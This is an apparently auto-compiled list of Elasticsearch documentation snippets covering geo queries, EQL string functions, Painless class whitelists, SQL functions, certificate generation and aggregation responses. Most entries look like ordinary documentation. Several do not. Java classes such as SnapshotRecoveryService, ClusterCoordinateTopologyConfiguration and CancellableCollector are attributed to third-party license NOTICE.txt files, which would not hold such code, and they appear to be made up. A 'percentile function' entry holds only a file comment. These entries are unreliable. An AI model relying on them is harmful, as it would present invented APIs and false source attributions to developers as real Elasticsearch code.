perform a geo_grid query based on geotile values in Elasticsearch. It retrieves documents that match the location's geotile value. The query, using the GET method, filters results by specified geotile bucket key.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-grid-query.md#2025-04-21_snippet_4\n\nLANGUAGE: Elasticsearch\nCODE:\n```\nGET /my_locations/_search\n{\n  \"query\": {\n    \"geo_grid\" :{\n      \"location\" : {\n        \"geotile\" : \"6/32/22\"\n      }\n    }\n  }\n}\n```\n\nLANGUAGE: Elasticsearch\nCODE:\n```\n{\n  \"took\" : 1,\n  \"timed_out\" : false,\n  \"_shards\" : {\n    \"total\" : 1,\n    \"successful\" : 1,\n    \"skipped\" : 0,\n    \"failed\" : 0\n  },\n  \"hits\" : {\n    \"total\" : {\n      \"value\" : 1,\n      \"relation\" : \"eq\"\n    },\n    \"max_score\" : 1.0,\n    \"hits\" : [\n      {\n        \"_index\" : \"my_locations\",\n        \"_id\" : \"3\",\n        \"_score\" : 1.0,\n        \"_source\" : {\n          \"location\" : \"POINT(2.336389 48.861111)\",\n          \"city\" : \"Paris\",\n          \"name\" : \"Musée du Louvre\"\n        }\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using the 'concat' Function in EQL for Elasticsearch\nDESCRIPTION: The 'concat' function returns a concatenated string of provided values. It supports strings, numbers, booleans, and null values. If any argument is null, the function returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-function-ref.md#2025-04-21_snippet_3\n\nLANGUAGE: eql\nCODE:\n```\nconcat(\"process is \", \"regsvr32.exe\")         // returns \"process is regsvr32.exe\"\nconcat(\"regsvr32.exe\", \" \", 42)               // returns \"regsvr32.exe 42\"\nconcat(\"regsvr32.exe\", \" \", 42.5)             // returns \"regsvr32.exe 42.5\"\nconcat(\"regsvr32.exe\", \" \", true)             // returns \"regsvr32.exe true\"\nconcat(\"regsvr32.exe\")                        // returns \"regsvr32.exe\"\n\n// process.name = \"regsvr32.exe\"\nconcat(process.name, \" \", 42)                 // returns \"regsvr32.exe 42\"\nconcat(process.name, \" \", 42.5)               // returns \"regsvr32.exe 42.5\"\nconcat(\"process is \", process.name)           // returns \"process is regsvr32.exe\"\nconcat(process.name, \" \", true)               // returns \"regsvr32.exe true\"\nconcat(process.name)                          // returns \"regsvr32.exe\"\n\n// process.arg_count = 4\nconcat(process.name, \" \", process.arg_count)  // returns \"regsvr32.exe 4\"\n\n// null handling\nconcat(null, \"regsvr32.exe\")                  // returns null\nconcat(process.name, null)                    // returns null\nconcat(null)                                  // returns null\n```\n\n----------------------------------------\n\nTITLE: Array Length Access in Painless\nDESCRIPTION: Demonstrates how to access the read-only length field of an array using the field access operator.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-array.md#2025-04-21_snippet_2\n\nLANGUAGE: painless\nCODE:\n```\nint[] x = new int[10];\nint l = x.length;\n```\n\n----------------------------------------\n\nTITLE: Building an Elasticsearch Plugin with Gradle\nDESCRIPTION: Command to build and package an Elasticsearch plugin into a ZIP file using Gradle. The plugin bundle is output to the build/distributions directory.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/extend/creating-stable-plugins.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngradle bundlePlugin\n```\n\n----------------------------------------\n\nTITLE: Configuring Kuromoji Part of Speech Filter in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to configure and use the kuromoji_part_of_speech token filter in Elasticsearch. It creates an index with a custom analyzer that uses the filter to remove specific Japanese parts of speech.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-speech.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT kuromoji_sample\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"analyzer\": {\n          \"my_analyzer\": {\n            \"tokenizer\": \"kuromoji_tokenizer\",\n            \"filter\": [\n              \"my_posfilter\"\n            ]\n          }\n        },\n        \"filter\": {\n          \"my_posfilter\": {\n            \"type\": \"kuromoji_part_of_speech\",\n            \"stoptags\": [\n              \"助詞-格助詞-一般\",\n              \"助詞-終助詞\"\n            ]\n          }\n        }\n      }\n    }\n  }\n}\n\nGET kuromoji_sample/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"寿司がおいしいね\"\n}\n```\n\n----------------------------------------\n\nTITLE: Complex Bucket Expressions in ESQL\nDESCRIPTION: Demonstrates using BUCKET in both aggregating and grouping parts of STATS command with complex expressions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/bucket.md#2025-04-21_snippet_8\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS s1 = b1 + 1, s2 = BUCKET(salary / 1000 + 999, 50.) + 2 BY b1 = BUCKET(salary / 100 + 99, 50.), b2 = BUCKET(salary / 1000 + 999, 50.)\n| SORT b1, b2\n| KEEP s1, b1, s2, b2\n```\n\n----------------------------------------\n\nTITLE: Single-step Extension Creation with Download URL\nDESCRIPTION: Creates and uploads an extension in a single step by providing a download_url in the initial POST request.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-custom-bundles.md#2025-04-21_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\ncurl -XPOST \\\n-H \"Authorization: ApiKey $EC_API_KEY\" \\\n-H 'content-type:application/json' \\\nhttps://api.elastic-cloud.com/api/v1/deployments/extensions \\\n-d'{\n  \"name\" : \"anylysis_icu\",\n  \"description\" : \"Helpful description\",\n  \"extension_type\" : \"plugin\",\n  \"version\" : \"7.13.2\",\n  \"download_url\": \"https://artifacts.elastic.co/downloads/elasticsearch-plugins/analysis-icu/analysis-icu-7.13.2.zip\"\n}'\n```\n\n----------------------------------------\n\nTITLE: Question Mark Operator Examples in Regular Expressions\nDESCRIPTION: Examples showing the question mark operator which makes the preceding character optional (zero or one occurrence).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/regexp-syntax.md#2025-04-21_snippet_4\n\nLANGUAGE: text\nCODE:\n```\nabc?     # matches 'ab' and 'abc'\n```\n\n----------------------------------------\n\nTITLE: Monitor ML Privilege\nDESCRIPTION: Read-only access for machine learning operations including dfeeds, jobs, model snapshots, and results\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/security-privileges.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\nmonitor_ml\n```\n\n----------------------------------------\n\nTITLE: Search Results for Scripted TF-IDF Similarity in Elasticsearch\nDESCRIPTION: The result of executing a search query with a custom TF-IDF similarity model in Elasticsearch. The response includes detailed explanation of how the score was calculated based on the scripted similarity.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/similarity.md#2025-04-21_snippet_3\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"took\": 12,\n  \"timed_out\": false,\n  \"_shards\": {\n    \"total\": 1,\n    \"successful\": 1,\n    \"skipped\": 0,\n    \"failed\": 0\n  },\n  \"hits\": {\n    \"total\": {\n        \"value\": 1,\n        \"relation\": \"eq\"\n    },\n    \"max_score\": 1.9508477,\n    \"hits\": [\n      {\n        \"_shard\": \"[index][0]\",\n        \"_node\": \"OzrdjxNtQGaqs4DmioFw9A\",\n        \"_index\": \"index\",\n        \"_id\": \"1\",\n        \"_score\": 1.9508477,\n        \"_source\": {\n          \"field\": \"foo bar foo\"\n        },\n        \"_explanation\": {\n          \"value\": 1.9508477,\n          \"description\": \"weight(field:foo in 0) [PerFieldSimilarity], result of:\",\n          \"details\": [\n            {\n              \"value\": 1.9508477,\n              \"description\": \"score from ScriptedSimilarity(weightScript=[null], script=[Script{type=inline, lang='painless', idOrCode='double tf = Math.sqrt(doc.freq); double idf = Math.log((field.docCount+1.0)/(term.docFreq+1.0)) + 1.0; double norm = 1/Math.sqrt(doc.length); return query.boost * tf * idf * norm;', options={}, params={}}]) computed from:\",\n              \"details\": [\n                {\n                  \"value\": 1.0,\n                  \"description\": \"weight\",\n                  \"details\": []\n                },\n                {\n                  \"value\": 1.7,\n                  \"description\": \"query.boost\",\n                  \"details\": []\n                },\n                {\n                  \"value\": 2,\n                  \"description\": \"field.docCount\",\n                  \"details\": []\n                },\n                {\n                  \"value\": 4,\n                  \"description\": \"field.sumDocFreq\",\n                  \"details\": []\n                },\n                {\n                  \"value\": 5,\n                  \"description\": \"field.sumTotalTermFreq\",\n                  \"details\": []\n                },\n                {\n                  \"value\": 1,\n                  \"description\": \"term.docFreq\",\n                  \"details\": []\n                },\n                {\n                  \"value\": 2,\n                  \"description\": \"term.totalTermFreq\",\n                  \"details\": []\n                },\n                {\n                  \"value\": 2.0,\n                  \"description\": \"doc.freq\",\n                  \"details\": []\n                },\n                {\n                  \"value\": 3,\n                  \"description\": \"doc.length\",\n                  \"details\": []\n                }\n              ]\n            }\n          ]\n        }\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating and Populating Geo-point Index\nDESCRIPTION: Example showing how to create an Elasticsearch index with geo_point mapping and populate it with location data points ordered by timestamp.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-geo-line.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT test\n{\n    \"mappings\": {\n        \"properties\": {\n            \"my_location\": { \"type\": \"geo_point\" },\n            \"group\":       { \"type\": \"keyword\" },\n            \"@timestamp\":  { \"type\": \"date\" }\n        }\n    }\n}\n\nPOST /test/_bulk?refresh\n{\"index\":{}}\n{\"my_location\": {\"lat\":52.373184, \"lon\":4.889187}, \"@timestamp\": \"2023-01-02T09:00:00Z\"}\n{\"index\":{}}\n{\"my_location\": {\"lat\":52.370159, \"lon\":4.885057}, \"@timestamp\": \"2023-01-02T10:00:00Z\"}\n{\"index\":{}}\n{\"my_location\": {\"lat\":52.369219, \"lon\":4.901618}, \"@timestamp\": \"2023-01-02T13:00:00Z\"}\n{\"index\":{}}\n{\"my_location\": {\"lat\":52.374081, \"lon\":4.912350}, \"@timestamp\": \"2023-01-02T16:00:00Z\"}\n{\"index\":{}}\n{\"my_location\": {\"lat\":52.371667, \"lon\":4.914722}, \"@timestamp\": \"2023-01-03T12:00:00Z\"}\n```\n\n----------------------------------------\n\nTITLE: Defining SnapshotRecoveryService for Elasticsearch\nDESCRIPTION: The main class constructor for the SnapshotRecoveryService which initializes the service with necessary dependencies from Elasticsearch. It sets up references to thread pools, repository service, cluster service, and client, all necessary for snapshot recovery operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-azure/licenses/siv-mode-NOTICE.txt#2025-04-22_snippet_0\n\nLANGUAGE: java\nCODE:\n```\npublic SnapshotRecoveryService(\n        ThreadPool threadPool,\n        TransportService transportService,\n        RepositoriesService repositoriesService,\n        ClusterService clusterService,\n        IndexNameExpressionResolver indexNameExpressionResolver,\n        Client client\n    ) {\n        super(threadPool, transportService, clusterService, indexNameExpressionResolver);\n        this.repositoriesService = repositoriesService;\n        this.clusterService = clusterService;\n        this.client = client;\n    }\n```\n\n----------------------------------------\n\nTITLE: Setting Same Shard Host Allocation in Elasticsearch YAML\nDESCRIPTION: This YAML snippet shows the cluster.routing.allocation.same_shard.host setting, which controls whether multiple copies of a shard can be allocated to distinct nodes on the same host.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/cluster-level-shard-allocation-routing-settings.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\ncluster.routing.allocation.same_shard.host\n```\n\n----------------------------------------\n\nTITLE: Modulo Operator in Elasticsearch SQL\nDESCRIPTION: Demonstrates the modulo operator (%) to find the remainder after division of two numeric values\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-operators-math.md#2025-04-21_snippet_5\n\nLANGUAGE: sql\nCODE:\n```\nSELECT 5 % 2 AS x;\n```\n\n----------------------------------------\n\nTITLE: Executing Functional Tests with Small Data Size\nDESCRIPTION: This snippet modifies the previous command to run the functional test with a smaller dataset, improving execution speed. The 'DATA_SIZE' parameter can be set to 'small' to achieve this.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-s3.md#2025-04-21_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\nmake ftest NAME=s3 DATA_SIZE=small\n```\n\n----------------------------------------\n\nTITLE: Switch-Style CASE Expression\nDESCRIPTION: Shows the switch-case style variant of CASE expression that compares a single expression against multiple values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-conditional.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nCASE expression\n     WHEN value1 THEN result1\n    [WHEN value2 THEN result2]\n    [WHEN ...]\n    [ELSE default_result]\nEND\n```\n\n----------------------------------------\n\nTITLE: Executing Date Field Script for Estimating Book Writing Start Date\nDESCRIPTION: This script uses the date_field context to estimate when an author started writing a book based on release date and page count. It demonstrates complex date and time calculations in Painless.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-api-examples.md#2025-04-21_snippet_9\n\nLANGUAGE: console\nCODE:\n```\nPOST /_scripts/painless/_execute\n{\n  \"script\": {\n    \"source\": \"\"\"\n      String author = doc['author'].value;\n      long pageTime = 28800000;  \n      if (author == 'Robert A. Heinlein') {\n        pageTime /= 2;           \n      } else if (author == 'Alastair Reynolds') {\n        pageTime *= 2;           \n      }\n      emit(doc['release_date'].value.toInstant().toEpochMilli() - pageTime * doc['page_count'].value);\n    \"\"\"\n  },\n  \"context\": \"date_field\",\n  \"context_setup\": {\n    \"index\": \"my-index-000001\",\n    \"document\": {\n      \"name\": \"Revelation Space\",\n      \"author\": \"Alastair Reynolds\",\n      \"release_date\": \"2000-03-15\",\n      \"page_count\": 585\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Text Parsing and Formatting Class Definitions and Methods\nDESCRIPTION: Defines classes for text processing including ParsePosition, RuleBasedCollator, SimpleDateFormat, and StringCharacterIterator. Includes methods for managing parsing locations, collation rules, date formatting patterns, and string iteration. Exception handling is also covered with ParseException classes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.text.txt#2025-04-21_snippet_3\n\nLANGUAGE: java\nCODE:\n```\nclass java.text.ParsePosition {\n  (int)\n  int getErrorIndex()\n  int getIndex()\n  void setErrorIndex(int)\n  void setIndex(int)\n}\n```\n\nLANGUAGE: java\nCODE:\n```\nclass java.text.RuleBasedCollator {\n  (String)\n  CollationElementIterator getCollationElementIterator(String)\n  String getRules()\n}\n```\n\nLANGUAGE: java\nCODE:\n```\nclass java.text.SimpleDateFormat {\n  ()\n  (String)\n  (String,Locale)\n  void applyLocalizedPattern(String)\n  void applyPattern(String)\n  Date get2DigitYearStart()\n  DateFormatSymbols getDateFormatSymbols()\n  void setDateFormatSymbols(DateFormatSymbols)\n  void set2DigitYearStart(Date)\n  String toLocalizedPattern()\n  String toPattern()\n}\n```\n\nLANGUAGE: java\nCODE:\n```\nclass java.text.StringCharacterIterator {\n  (String)\n  (String,int)\n  (String,int,int,int)\n  void setText(String)\n}\n```\n\nLANGUAGE: java\nCODE:\n```\nclass java.text.Normalizer$Form {\n  Normalizer.Form NFC\n  Normalizer.Form NFD\n  Normalizer.Form NFKC\n  Normalizer.Form NFKD\n  Normalizer.Form valueOf(String)\n  Normalizer.Form[] values()\n}\n```\n\nLANGUAGE: java\nCODE:\n```\nclass java.text.ParseException {\n  (String,int)\n  int getErrorOffset()\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Percentile Function in SQL for Elasticsearch\nDESCRIPTION: This SQL snippet defines the percentile function for use in Elasticsearch's ESQL. It converts a multivalued field into a single valued field containing the value at which a certain percentage of observed values occur.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/mv_percentile.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Defining NoSuchFieldException in Java\nDESCRIPTION: This snippet defines the java.lang.NoSuchFieldException class, thrown if an application tries to access a field of an object, but the object does not have a field with the specified name. It includes a default constructor and a constructor that accepts a string message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_43\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.NoSuchFieldException {\n  ()\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Integer Class Methods and Constants in Java\nDESCRIPTION: This snippet shows the public methods and constants of the java.lang.Integer class. It includes constants like MAX_VALUE and MIN_VALUE, and methods for bit manipulation, parsing, and comparing integer values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_12\n\nLANGUAGE: Java\nCODE:\n```\nclass java.lang.Integer {\n  int BYTES\n  int MAX_VALUE\n  int MIN_VALUE\n  int SIZE\n  int bitCount(int)\n  int compare(int,int)\n  int compareTo(Integer)\n  int compareUnsigned(int,int)\n  Integer decode(String)\n  int divideUnsigned(int,int)\n  int hashCode(int)\n  int highestOneBit(int)\n  int lowestOneBit(int)\n  int max(int,int)\n  int min(int,int)\n  int numberOfLeadingZeros(int)\n  int numberOfTrailingZeros(int)\n  int parseInt(String)\n  int parseInt(String,int)\n  int parseUnsignedInt(String)\n  int parseUnsignedInt(String,int)\n  int remainderUnsigned(int,int)\n  int reverse(int)\n  int reverseBytes(int)\n  int rotateLeft(int,int)\n  int rotateRight(int,int)\n  int signum(int)\n  String toBinaryString(int)\n  String toHexString(int)\n  String toOctalString(int)\n  String toString(int)\n  String toString(int,int)\n  long toUnsignedLong(int)\n  String toUnsignedString(int)\n  String toUnsignedString(int,int)\n  Integer valueOf(int)\n  Integer valueOf(String,int)\n}\n```\n\n----------------------------------------\n\nTITLE: Changing Default Similarity After Index Creation in Elasticsearch\nDESCRIPTION: A sequence of operations to change the default similarity model for an existing Elasticsearch index. This requires closing the index, updating the settings, and then reopening it.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/similarity.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPOST /index/_close\n\nPUT /index/_settings\n{\n  \"index\": {\n    \"similarity\": {\n      \"default\": {\n        \"type\": \"boolean\"\n      }\n    }\n  }\n}\n\nPOST /index/_open\n```\n\n----------------------------------------\n\nTITLE: Defining java.util.Collection Methods in Painless\nDESCRIPTION: This snippet defines the methods for the java.util.Collection interface in the Painless scripting language. The methods allow for manipulating collections, including adding, removing, and querying elements. It also includes adaptations of Groovy methods for enhanced functionality.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass java.util.Collection {\n  boolean add(def)\n  boolean addAll(Collection)\n  void clear()\n  boolean contains(def)\n  boolean containsAll(Collection)\n  boolean isEmpty()\n  boolean removeAll(Collection)\n  boolean removeIf(Predicate)\n  boolean retainAll(Collection)\n  int size()\n  Spliterator spliterator()\n  Stream stream()\n  def[] toArray()\n  def[] toArray(def[])\n\n  # some adaptations of groovy methods\n  List org.elasticsearch.painless.api.Augmentation collect(Function)\n  def org.elasticsearch.painless.api.Augmentation collect(Collection,Function)\n  def org.elasticsearch.painless.api.Augmentation find(Predicate)\n  List org.elasticsearch.painless.api.Augmentation findAll(Predicate)\n  def org.elasticsearch.painless.api.Augmentation findResult(Function)\n  def org.elasticsearch.painless.api.Augmentation findResult(def,Function)\n  List org.elasticsearch.painless.api.Augmentation split(Predicate)\n}\n```\n\n----------------------------------------\n\nTITLE: Generating HTTP Certificate with Elasticsearch Certutil\nDESCRIPTION: This command creates an HTTP certificate for Elasticsearch using `elasticsearch-certutil`. It outputs a ZIP file containing the certificate and key in PEM format. It sets the validity period, specifies DNS names and IP addresses for the certificate and uses a CA for signing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/reindex/src/test/resources/org/elasticsearch/reindex/README.txt#2025-04-21_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n$ES_HOME/bin/elasticsearch-certutil cert --out http.zip --pass \"http-password\" \\\n    --days 9999 --pem --name \"http\" \\\n    --ca ca.p12 --ca-pass \"ca-password\" \\\n    --dns=localhost --dns=localhost.localdomain --dns=localhost4 --dns=localhost4.localdomain4 --dns=localhost6 --dns=localhost6.localdomain6 \\\n    --ip=127.0.0.1 --ip=0:0:0:0:0:0:0:1\nunzip http.zip\nrm http.zip\n```\n\n----------------------------------------\n\nTITLE: Complete Serial Differencing Query with Date Histogram\nDESCRIPTION: Complete example showing how to embed a serial differencing aggregation within a date histogram aggregation. Includes a sum metric calculation and a 30-day lag difference calculation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-serialdiff-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n   \"size\": 0,\n   \"aggs\": {\n      \"my_date_histo\": {\n         \"date_histogram\": {\n            \"field\": \"timestamp\",\n            \"calendar_interval\": \"day\"\n         },\n         \"aggs\": {\n            \"the_sum\": {\n               \"sum\": {\n                  \"field\": \"lemmings\"\n               }\n            },\n            \"thirtieth_difference\": {\n               \"serial_diff\": {\n                  \"buckets_path\": \"the_sum\",\n                  \"lag\" : 30\n               }\n            }\n         }\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Int Summary Statistics Gathering in Java\nDESCRIPTION: This snippet defines the IntSummaryStatistics class, which compiles statistics such as count, sum, min, max, and average for int values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_23\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.IntSummaryStatistics {\n  ()\n  void combine(IntSummaryStatistics)\n  double getAverage()\n  long getCount()\n  int getMax()\n  int getMin()\n  long getSum()\n}\n```\n\n----------------------------------------\n\nTITLE: Geo-distance query with lat/lon as properties in Elasticsearch\nDESCRIPTION: This snippet demonstrates the use of the `geo_distance` filter with latitude and longitude specified as separate properties within the `pin.location` field. The query searches for documents within a 12km radius of the specified coordinates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-distance-query.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET /my_locations/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match_all\": {}\n      },\n      \"filter\": {\n        \"geo_distance\": {\n          \"distance\": \"12km\",\n          \"pin.location\": {\n            \"lat\": 40,\n            \"lon\": -70\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Example of CEIL/CEILING Function Usage\nDESCRIPTION: Demonstrates using both CEIL and CEILING functions with positive and negative numbers, showing they return the nearest integer greater than or equal to the input.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_5\n\nLANGUAGE: sql\nCODE:\n```\nSELECT CEIL(125.01), CEILING(-125.99);\n\n CEIL(125.01)  |CEILING(-125.99)\n---------------+----------------\n126            |-125\n```\n\n----------------------------------------\n\nTITLE: Using Fields Parameter in EQL Search for Elasticsearch\nDESCRIPTION: This example shows how to use the fields parameter to retrieve and format specific fields in the EQL search response, including wildcard patterns and custom formatting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_18\n\nLANGUAGE: console\nCODE:\n```\nGET /my-data-stream/_eql/search?filter_path=-hits.events._source\n{\n  \"query\": \"\"\"\n    process where process.name == \"regsvr32.exe\"\n  \"\"\",\n  \"fields\": [\n    \"event.type\",\n    \"process.*\",\n    {\n      \"field\": \"@timestamp\",\n      \"format\": \"epoch_millis\"\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: EQL Length Function Examples\nDESCRIPTION: Examples showing the length function for getting string character counts. Includes empty string and null handling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-function-ref.md#2025-04-21_snippet_7\n\nLANGUAGE: eql\nCODE:\n```\nlength(\"explorer.exe\")         // returns 12\nlength(\"start explorer.exe\")   // returns 18\nlength(\"\")                     // returns 0\nlength(null)                   // returns null\n\n// process.name = \"regsvr32.exe\"\nlength(process.name)           // returns 12\n```\n\n----------------------------------------\n\nTITLE: Creating a CancellableCollector with custom Collection factory\nDESCRIPTION: Example showing how to create a CancellableCollector with both a custom collection factory and a cancellation check function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/vector-tile/licenses/slf4j-nop-NOTICE.txt#2025-04-21_snippet_2\n\nLANGUAGE: java\nCODE:\n```\nCancellableCollector<SearchHit> cancellableCollector = CancellableCollector.newCollector(\n    ArrayList::new,  // Custom collection factory\n    Collectors.toList(),\n    () -> checkCancellation()  // Custom cancellation check function\n);\n```\n\n----------------------------------------\n\nTITLE: Static Imports for Dissect Methods in Painless for Elasticsearch\nDESCRIPTION: Defines static imports for two dissect methods from the NamedGroupExtractor class. These methods are marked with @compile_time_only, indicating they are resolved at compile time.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/runtime-fields-common/src/main/resources/org/elasticsearch/runtimefields/common_whitelist.txt#2025-04-21_snippet_1\n\nLANGUAGE: Painless\nCODE:\n```\nstatic_import {\n    org.elasticsearch.runtimefields.NamedGroupExtractor dissect(String) from_class org.elasticsearch.runtimefields.NamedGroupExtractor @compile_time_only\n    org.elasticsearch.runtimefields.NamedGroupExtractor dissect(String, String) from_class org.elasticsearch.runtimefields.NamedGroupExtractor @compile_time_only\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Supported Protocols for Remote Cluster Client SSL in Elasticsearch\nDESCRIPTION: Setting to specify supported SSL/TLS protocol versions for remote cluster client connections. Default values depend on JVM's SSL provider support for TLSv1.3.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_40\n\nLANGUAGE: properties\nCODE:\n```\nxpack.security.remote_cluster_client.ssl.supported_protocols\n```\n\n----------------------------------------\n\nTITLE: Defining ClusterCoordinateTopologyConfiguration Class in Java\nDESCRIPTION: This snippet defines the ClusterCoordinateTopologyConfiguration class, which extends ClusterCoordinateBaseConfiguration. It includes constructor, getter, and setter methods for managing cluster coordinate topology settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-oauth-client-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\npublic class ClusterCoordinateTopologyConfiguration extends ClusterCoordinateBaseConfiguration {\n\n    private final ClusterCoordinateSettings.TopologyImpl topology;\n\n    public ClusterCoordinateTopologyConfiguration(\n        ClusterCoordinateSettings.TopologyImpl topology,\n        TimeValue publishTimeout,\n        ClusterCoordinateSettings.Follower follower,\n        int minimumMasterNodes,\n        int expectedNodes,\n        TimeValue initialClusterFormationWaitTime,\n        NoMasterBlockService noMasterBlockService\n    ) {\n        super(publishTimeout, follower, minimumMasterNodes, expectedNodes, initialClusterFormationWaitTime, noMasterBlockService);\n        this.topology = topology;\n    }\n\n    public ClusterCoordinateSettings.TopologyImpl getTopology() {\n        return topology;\n    }\n\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) return true;\n        if (o == null || getClass() != o.getClass()) return false;\n        if (super.equals(o) == false) return false;\n        ClusterCoordinateTopologyConfiguration that = (ClusterCoordinateTopologyConfiguration) o;\n        return Objects.equals(topology, that.topology);\n    }\n\n    @Override\n    public int hashCode() {\n        return Objects.hash(super.hashCode(), topology);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Response for Multi Terms Aggregation with Missing Values\nDESCRIPTION: Example response showing how documents with missing values are grouped using the provided default value in the missing parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-multi-terms-aggregation.md#2025-04-21_snippet_5\n\nLANGUAGE: console-result\nCODE:\n```\n{\n   ...\n   \"aggregations\" : {\n    \"genres_and_products\" : {\n      \"doc_count_error_upper_bound\" : 0,\n      \"sum_other_doc_count\" : 0,\n      \"buckets\" : [\n        {\n          \"key\" : [\n            \"rock\",\n            \"Product A\"\n          ],\n          \"key_as_string\" : \"rock|Product A\",\n          \"doc_count\" : 2\n        },\n        {\n          \"key\" : [\n            \"electronic\",\n            \"Product B\"\n          ],\n          \"key_as_string\" : \"electronic|Product B\",\n          \"doc_count\" : 1\n        },\n        {\n          \"key\" : [\n            \"electronic\",\n            \"Product Z\"\n          ],\n          \"key_as_string\" : \"electronic|Product Z\",  <1>\n          \"doc_count\" : 1\n        },\n        {\n          \"key\" : [\n            \"jazz\",\n            \"Product B\"\n          ],\n          \"key_as_string\" : \"jazz|Product B\",\n          \"doc_count\" : 1\n        },\n        {\n          \"key\" : [\n            \"rock\",\n            \"Product B\"\n          ],\n          \"key_as_string\" : \"rock|Product B\",\n          \"doc_count\" : 1\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: 